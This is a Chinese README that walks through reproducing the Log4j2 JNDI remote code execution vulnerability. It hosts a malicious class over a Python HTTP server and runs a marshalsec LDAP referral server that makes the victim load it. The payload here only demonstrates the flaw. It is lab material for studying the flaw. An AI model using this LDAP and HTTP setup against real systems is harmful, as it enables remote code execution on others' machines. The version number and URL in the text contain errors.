# apache-log4j2-bug

1. 集成了log4j2的java项目。本示例：log4j的版本是`1.14.1`，JDK环境`1.8.0_121`。
2. 编译好的恶意`class`文件。本示例：恶意class文件在Windows环境运行**弹出计算器**，在Unix环境运行**列出运行环境监听的所有端口并生成图片test.jpg到程序运行目录**。
3. `LDAP`服务。本示例：使用`marshalsec-0.0.3-SNAPSHOT-all.jar`启动一个简单的`LDAP`服务。
4. 远程获取恶意class文件`http`服务。本示例：使用Python启动http服务，

从git上克隆项目到本地，github项目地址：[https://github.com/FengMengZhao/apache-log4j2-bug.git](https://github.com/FengMengZhao/apache-log4j2-bug.git)，gitee备份项目地址：[https://gitee.com/fengmengzhao/apache-log4j2-bug.git](https://gitee.com/fengmengzhao/apache-log4j2-bug.git)。

1). 导入maven项目到IDE中，或者使用`mvn`命令行下载maven依赖。

2). 将`Log4jRCE.java`类本地编译生成的class文件，该class文件即为恶意远程class文件，将该class提供为http可访问服务。可以将java和class文件copy到一个目录中，在该目录中启动简单的python http server：

> java源代码文件实际上并不需要，这里复制java源文件是为了验证http远程可访问。

```shell
#进入class文件所在的目录执行
/usr/bin/python3 -m http.server
```

服务端启动如图，默认端口是8000：

![](https://gitee.com/fengmengzhao/fengmengzhao.github.io/raw/master/img/posts/log4j-remote-class-python-httpserver.png)

http访问java文件验证：

![](https://gitee.com/fengmengzhao/fengmengzhao.github.io/raw/master/img/posts/log4j-remote-class-source-code-http-access.png)

3). 在项目`tool`目录下找到文件`marshalsec-0.0.3-SNAPSHOT-all.jar`，该jar包用于创建简单的`LDAP`服务。启动LDAP服务，默认监听`1389`端口号，需要指定2)中启动的远程http服务：

```shell
#可以在最后加上一个参数指定LDAP服务端口，模式是1389
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://ip:port:8000/#Log4jRCE
```

启动`LDAP`服务后，默认监听`1389`端口，如图：

![](https://gitee.com/fengmengzhao/fengmengzhao.github.io/raw/master/img/posts/log4j-ldap-service.png)

4). 执行`log4j`的main方法，即可验证攻击完成：

在Windows平台上运行，弹出计算器：

![](https://gitee.com/fengmengzhao/fengmengzhao.github.io/raw/master/img/posts/log4j-win-invoke-calculator.png)

在Unix平台上运行，获取后台监听端口及进程，并将内容在运行目录生成`test.jpg`：

![](https://gitee.com/fengmengzhao/fengmengzhao.github.io/raw/master/img/posts/log4j-unix-get-listen-port-and-generate-pic.jpg)

> 如果不能够成功复现攻击，报错`11:54:23.960 [main] ERROR log4j - Reference Class Name: foo`，可能是JDK版本过高。降低版本到`1.8.0_191`之下再尝试。
